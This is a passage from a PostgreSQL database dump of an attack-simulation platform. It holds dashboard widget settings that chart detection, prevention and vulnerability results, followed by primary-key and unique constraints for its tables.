68108576-82d2-4561-b468-f8f18db8c8cd	DONUT	{"end": null, "mode": "structural", "field": "inject_expectation_status", "limit": 100, "start": null, "title": "Detection", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["DETECTION"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 4, "widget_layout_w": 2, "widget_layout_x": 0, "widget_layout_y": 0}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.42379+00	2026-01-09 14:19:32.446622+00
c1effc21-3745-4e45-b67d-2a67fcee530c	NUMBER	{"end": null, "start": null, "title": "Inject", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["inject"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 8, "widget_layout_y": 0}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.424641+00	2026-01-09 14:19:32.448331+00
9960587e-9ff1-40b2-86c1-2a98a9509ec3	NUMBER	{"end": null, "start": null, "title": "Total number of findings", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["finding"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 8, "widget_layout_y": 4}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.425585+00	2026-01-09 14:19:32.449779+00
d02d4e87-62b4-4b2b-a4c9-e354b3e4a5a6	DONUT	{"end": null, "mode": "structural", "field": "inject_expectation_status", "limit": 100, "start": null, "title": "Prevention", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["PREVENTION"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 4, "widget_layout_w": 2, "widget_layout_x": 2, "widget_layout_y": 0}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.426429+00	2026-01-09 14:19:32.451359+00
9cf8b0c1-fcdd-467f-aa17-3bd1759ff1f8	DONUT	{"end": null, "mode": "structural", "field": "inject_expectation_status", "limit": 100, "start": null, "title": "Vulnerability", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["VULNERABILITY"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 4, "widget_layout_w": 2, "widget_layout_x": 4, "widget_layout_y": 0}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.427517+00	2026-01-09 14:19:32.452926+00
a642b3a6-9290-41a2-9481-2be6e537b1f5	DONUT	{"end": null, "mode": "structural", "field": "vulnerable_endpoint_action", "limit": 100, "start": null, "title": "Recommended action", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["vulnerable-endpoint"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 4, "widget_layout_w": 2, "widget_layout_x": 6, "widget_layout_y": 0}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.428548+00	2026-01-09 14:19:32.454327+00
f3d5d5e3-679d-4e3a-9294-8e215b4a9530	LIST	{"end": null, "limit": 100, "sorts": [{"direction": "DESC", "fieldName": "base_created_at"}], "start": null, "title": "Vulnerable endpoints", "series": [], "columns": ["vulnerable_endpoint_hostname", "base_created_at", "vulnerable_endpoint_agents_active_status", "vulnerable_endpoint_action", "vulnerable_endpoint_findings_summary"], "time_range": "DEFAULT", "perspective": {"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["vulnerable-endpoint"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}, "date_attribute": "base_created_at", "widget_configuration_type": "list"}	{"widget_layout_h": 5, "widget_layout_w": 12, "widget_layout_x": 0, "widget_layout_y": 12}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.429732+00	2026-01-09 14:19:32.456211+00
3c900aca-19b2-44a7-9153-3dd04e599a55	VERTICAL_BAR_CHART	{"end": null, "mode": "temporal", "start": null, "title": "UNDETECTED/UNPREVENTED INJECTS BY WEEK", "series": [{"name": "Not Detected", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["DETECTION"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}, {"name": "Not Prevented", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["PREVENTION"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}], "stacked": false, "interval": "week", "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "temporal-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 0, "widget_layout_y": 17}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.43086+00	2026-01-09 14:19:32.458072+00
28c26866-7717-4d66-830a-e39e50710a7b	NUMBER	{"end": null, "start": null, "title": "CVEs Found", "series": [{"name": "CVEsfound", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["finding"], "operator": "eq"}, {"key": "finding_type", "mode": "or", "values": ["CVE"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 10, "widget_layout_y": 2}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.432093+00	2026-01-09 14:19:32.461808+00
9b9b5e3e-d207-4cad-85a0-36697a5ce629	HORIZONTAL_BAR_CHART	{"end": null, "mode": "structural", "field": "base_attack_patterns_side", "limit": 10, "start": null, "title": "MOST UNDETECTED &UNPREVENTED TTPS", "series": [{"name": "Undetected TTPs", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["DETECTION"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}, {"name": "UnpreventedTTPs", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["PREVENTION"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 8, "widget_layout_y": 17}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.433053+00	2026-01-09 14:19:32.463787+00
9c0784d8-2c21-4fc9-a95b-913f400299fe	VERTICAL_BAR_CHART	{"end": null, "mode": "structural", "field": "base_security_platforms_side", "limit": 100, "start": null, "title": "Inject undetected & unprevented by security platform", "series": [{"name": "Not Detected", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["DETECTION"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}, {"name": "Not Prevented", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["PREVENTION"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 12, "widget_layout_x": 0, "widget_layout_y": 33}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.433946+00	2026-01-09 14:19:32.465588+00
f00b3b9c-686e-4e6c-99db-6e19a3a0a526	SECURITY_COVERAGE_CHART	{"end": null, "mode": "structural", "field": "base_attack_patterns_side", "limit": 100, "start": null, "title": "LAST DETECTION COVERAGE", "series": [{"name": "SUCCESS", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "and", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "and", "values": ["SUCCESS"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "and", "values": ["DETECTION"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "and", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}, {"name": "FAILED", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "and", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "and", "values": ["FAILED"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "and", "values": ["DETECTION"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "and", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 10, "widget_layout_w": 12, "widget_layout_x": 0, "widget_layout_y": 23}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.434889+00	2026-01-09 14:19:32.468576+00
7439df12-be75-4ace-ba6f-ad889c48beaa	DONUT	{"end": null, "mode": "structural", "field": "inject_status", "limit": 10, "start": null, "title": "Inject status", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["inject"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 6, "widget_layout_x": 0, "widget_layout_y": 39}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.435952+00	2026-01-09 14:19:32.470675+00
7ed467cd-01c1-49e1-9001-b0208665eb24	LIST	{"end": null, "limit": 100, "sorts": [{"direction": "DESC", "fieldName": "base_created_at"}], "start": null, "title": "findings", "series": [], "columns": ["finding_value", "base_created_at", "finding_type"], "time_range": "DEFAULT", "perspective": {"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["finding"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}, "date_attribute": "base_created_at", "widget_configuration_type": "list"}	{"widget_layout_h": 8, "widget_layout_w": 8, "widget_layout_x": 0, "widget_layout_y": 4}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.436775+00	2026-01-09 14:19:32.47231+00
a312d5e1-d89f-44f0-a64e-a3e37a92eca4	LIST	{"end": null, "limit": 10, "sorts": [{"direction": "DESC", "fieldName": "base_created_at"}], "start": null, "title": "Latest Injects", "series": [], "columns": ["inject_status", "base_created_at", "execution_date", "base_attack_patterns_side"], "time_range": "DEFAULT", "perspective": {"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["inject"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}, "date_attribute": "base_created_at", "widget_configuration_type": "list"}	{"widget_layout_h": 6, "widget_layout_w": 6, "widget_layout_x": 6, "widget_layout_y": 39}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.437758+00	2026-01-09 14:19:32.474196+00
b2b99c6f-7841-46fd-be46-24c2537eddb1	DONUT	{"end": null, "mode": "structural", "field": "inject_expectation_status", "limit": 10, "start": null, "title": "Performance overview", "series": [{"name": "Performance overview", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["MANUAL"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 4, "widget_layout_w": 2, "widget_layout_x": 0, "widget_layout_y": 0}	a3964671-ee00-48a6-bb94-7cc80d7170a3	2026-01-09 14:19:32.498404+00	2026-01-09 14:19:32.498411+00
df359bdd-1c76-485c-ac42-689f271134cb	DONUT	{"end": null, "mode": "structural", "field": "base_team_side", "limit": 10, "start": null, "title": "TEAMS ENGAGED", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 8, "widget_layout_y": 0}	a3964671-ee00-48a6-bb94-7cc80d7170a3	2026-01-09 14:19:32.499602+00	2026-01-09 14:19:32.499611+00
b951fd93-32fc-4550-9a7f-664aa73eb4c7	HORIZONTAL_BAR_CHART	{"end": null, "mode": "structural", "field": "inject_expectation_type", "limit": 10, "start": null, "title": "Injects Types", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 4, "widget_layout_y": 0}	a3964671-ee00-48a6-bb94-7cc80d7170a3	2026-01-09 14:19:32.501224+00	2026-01-09 14:19:32.501234+00
9bd72fe8-2db6-4264-9588-91312f8b8a8f	NUMBER	{"end": null, "start": null, "title": "Injects", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["inject"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 0, "widget_layout_y": 4}	a3964671-ee00-48a6-bb94-7cc80d7170a3	2026-01-09 14:19:32.5023+00	2026-01-09 14:19:32.50231+00
42acd60a-88e2-4cb8-845a-0b0a2cfef48b	VERTICAL_BAR_CHART	{"end": null, "mode": "structural", "field": "base_team_side", "limit": 100, "start": null, "title": "Success/Fails by teams", "series": [{"name": "Failed", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["DOCUMENT", "ARTICLE", "CHALLENGE", "MANUAL"], "operator": "eq"}]}}, {"name": "Success", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["TEXT", "DOCUMENT", "ARTICLE", "CHALLENGE", "MANUAL"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["SUCCESS"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 8, "widget_layout_x": 4, "widget_layout_y": 6}	a3964671-ee00-48a6-bb94-7cc80d7170a3	2026-01-09 14:19:32.503447+00	2026-01-09 14:19:32.503458+00
39856479-a591-45e1-8573-096fff750bec	LINE	{"end": null, "mode": "temporal", "start": null, "title": "Scenarios over time", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["scenario"], "operator": "eq"}]}}], "stacked": false, "interval": "week", "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "temporal-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 0, "widget_layout_y": 6}	a3964671-ee00-48a6-bb94-7cc80d7170a3	2026-01-09 14:19:32.505059+00	2026-01-09 14:19:32.50507+00
f38ba05e-1b82-468d-9c5e-17980ffb7fe7	NUMBER	{"end": null, "start": null, "title": "Injects not success", "series": [{"name": "Injects failed", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["inject"], "operator": "eq"}, {"key": "inject_status", "mode": "or", "values": ["SUCCESS"], "operator": "not_eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 2, "widget_layout_y": 4}	a3964671-ee00-48a6-bb94-7cc80d7170a3	2026-01-09 14:19:32.506447+00	2026-01-09 14:19:32.506457+00
0cc21289-6131-47a0-b38b-b6830471c68e	DONUT	{"end": null, "mode": "structural", "field": "inject_status", "limit": 10, "start": null, "title": "Injects status", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["inject"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 5, "widget_layout_x": 0, "widget_layout_y": 12}	a3964671-ee00-48a6-bb94-7cc80d7170a3	2026-01-09 14:19:32.507945+00	2026-01-09 14:19:32.507955+00
a5c434f2-b01e-4e5a-a7a9-be4b3a19eaa6	NUMBER	{"end": null, "start": null, "title": "scenarios", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["scenario"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 2, "widget_layout_y": 0}	a3964671-ee00-48a6-bb94-7cc80d7170a3	2026-01-09 14:19:32.509045+00	2026-01-09 14:19:32.509057+00
06e92399-a8ee-4ef9-aafc-bf20d408e6bb	LIST	{"end": null, "limit": 100, "sorts": [{"direction": "DESC", "fieldName": "base_created_at"}], "start": null, "title": "Latest Scenarios", "series": [], "columns": ["name", "base_created_at", "status", "base_tags_side"], "time_range": "DEFAULT", "perspective": {"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["scenario"], "operator": "eq"}]}}, "date_attribute": "base_created_at", "widget_configuration_type": "list"}	{"widget_layout_h": 6, "widget_layout_w": 7, "widget_layout_x": 5, "widget_layout_y": 12}	a3964671-ee00-48a6-bb94-7cc80d7170a3	2026-01-09 14:19:32.510364+00	2026-01-09 14:19:32.510375+00
88d2698c-1d9f-42d7-a855-78e44cbe4c8f	NUMBER	{"end": null, "start": null, "title": "Simulations Finished", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["simulation"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": [], "operator": "eq"}, {"key": "status", "mode": "or", "values": ["FINISHED"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 2, "widget_layout_y": 2}	a3964671-ee00-48a6-bb94-7cc80d7170a3	2026-01-09 14:19:32.511625+00	2026-01-09 14:19:32.511632+00
64f43466-9ea7-441e-9320-4793593a52ab	LIST	{"end": null, "limit": 100, "sorts": [{"direction": "DESC", "fieldName": "base_created_at"}], "start": null, "title": "Latest simulations", "series": [], "columns": ["name", "status", "base_created_at", "base_tags_side"], "time_range": "DEFAULT", "perspective": {"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["simulation"], "operator": "eq"}]}}, "date_attribute": "base_created_at", "widget_configuration_type": "list"}	{"widget_layout_h": 6, "widget_layout_w": 12, "widget_layout_x": 0, "widget_layout_y": 18}	a3964671-ee00-48a6-bb94-7cc80d7170a3	2026-01-09 14:19:32.51278+00	2026-01-09 14:19:32.512788+00
\.


--
-- Name: exercise_launch_order_seq; Type: SEQUENCE SET; Schema: public; Owner: user
--

SELECT pg_catalog.setval('public.exercise_launch_order_seq', 13, true);


--
-- Name: agents agents_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.agents
    ADD CONSTRAINT agents_pkey PRIMARY KEY (agent_id);


--
-- Name: asset_agent_jobs asset_agent_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.asset_agent_jobs
    ADD CONSTRAINT asset_agent_pkey PRIMARY KEY (asset_agent_id);


--
-- Name: asset_groups_assets asset_groups_assets_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.asset_groups_assets
    ADD CONSTRAINT asset_groups_assets_pkey PRIMARY KEY (asset_group_id, asset_id);


--
-- Name: asset_groups asset_groups_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.asset_groups
    ADD CONSTRAINT asset_groups_pkey PRIMARY KEY (asset_group_id);


--
-- Name: asset_groups_tags asset_groups_tags_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.asset_groups_tags
    ADD CONSTRAINT asset_groups_tags_pkey PRIMARY KEY (asset_group_id, tag_id);


--
-- Name: assets assets_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.assets
    ADD CONSTRAINT assets_pkey PRIMARY KEY (asset_id);


--
-- Name: assets_tags assets_tags_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.assets_tags
    ADD CONSTRAINT assets_tags_pkey PRIMARY KEY (asset_id, tag_id);


--
-- Name: challenges_documents challenges_documents_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.challenges_documents
    ADD CONSTRAINT challenges_documents_pkey PRIMARY KEY (challenge_id, document_id);


--
-- Name: challenges_flags challenges_flags_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.challenges_flags
    ADD CONSTRAINT challenges_flags_pkey PRIMARY KEY (flag_id);


--
-- Name: challenges challenges_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.challenges
    ADD CONSTRAINT challenges_pkey PRIMARY KEY (challenge_id);


--
-- Name: challenges_tags challenges_tags_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.challenges_tags
    ADD CONSTRAINT challenges_tags_pkey PRIMARY KEY (challenge_id, tag_id);


--
-- Name: channels channels_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.channels
    ADD CONSTRAINT channels_pkey PRIMARY KEY (channel_id);


--
-- Name: collectors collector_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.collectors
    ADD CONSTRAINT collector_pkey PRIMARY KEY (collector_id);


--
-- Name: comchecks comchecks_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.comchecks
    ADD CONSTRAINT comchecks_pkey PRIMARY KEY (comcheck_id);


--
-- Name: comchecks_statuses comchecks_statuses_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.comchecks_statuses
    ADD CONSTRAINT comchecks_statuses_pkey PRIMARY KEY (status_id);


--
-- Name: communications communications_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.communications
    ADD CONSTRAINT communications_pkey PRIMARY KEY (communication_id);


--
-- Name: communications_users communications_users_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.communications_users
    ADD CONSTRAINT communications_users_pkey PRIMARY KEY (communication_id, user_id);


--
-- Name: contract_output_elements contract_output_elements_contract_output_element_key_contra_key; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.contract_output_elements
    ADD CONSTRAINT contract_output_elements_contract_output_element_key_contra_key UNIQUE (contract_output_element_key, contract_output_element_output_parser_id);


--
-- Name: contract_output_elements contract_output_elements_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.contract_output_elements
    ADD CONSTRAINT contract_output_elements_pkey PRIMARY KEY (contract_output_element_id);


--
-- Name: contract_output_elements_tags contract_output_elements_tags_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.contract_output_elements_tags
    ADD CONSTRAINT contract_output_elements_tags_pkey PRIMARY KEY (contract_output_element_id, tag_id);


--
-- Name: custom_dashboards_parameters custom_dashboards_parameters_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.custom_dashboards_parameters
    ADD CONSTRAINT custom_dashboards_parameters_pkey PRIMARY KEY (custom_dashboards_parameter_id);


--
-- Name: custom_dashboards custom_dashboards_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.custom_dashboards
    ADD CONSTRAINT custom_dashboards_pkey PRIMARY KEY (custom_dashboard_id);


--
-- Name: vulnerability_reference_urls cve_reference_urls_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.vulnerability_reference_urls
    ADD CONSTRAINT cve_reference_urls_pkey PRIMARY KEY (vulnerability_id, vulnerability_reference_url);


--
-- Name: vulnerabilities cves_cve_external_id_key; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.vulnerabilities
    ADD CONSTRAINT cves_cve_external_id_key UNIQUE (vulnerability_external_id);


--
-- Name: vulnerabilities_cwes cves_cwes_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.vulnerabilities_cwes
    ADD CONSTRAINT cves_cwes_pkey PRIMARY KEY (vulnerability_id, cwe_id);


--
-- Name: vulnerabilities cves_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.vulnerabilities
    ADD CONSTRAINT cves_pkey PRIMARY KEY (vulnerability_id);


--
-- Name: cwes cwes_cwe_external_id_key; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.cwes
    ADD CONSTRAINT cwes_cwe_external_id_key UNIQUE (cwe_external_id);


--
-- Name: cwes cwes_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.cwes
    ADD CONSTRAINT cwes_pkey PRIMARY KEY (cwe_id);


--
-- Name: detection_remediations detection_remediation_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.detection_remediations
    ADD CONSTRAINT detection_remediation_pkey PRIMARY KEY (detection_remediation_id);


--
-- Name: documents documents_pkey; Type: CONSTRAINT; Schema: public; Owner: user
--

ALTER TABLE ONLY public.documents
    ADD CONSTRAINT documents_pkey PRIMARY KEY (document_id);


--
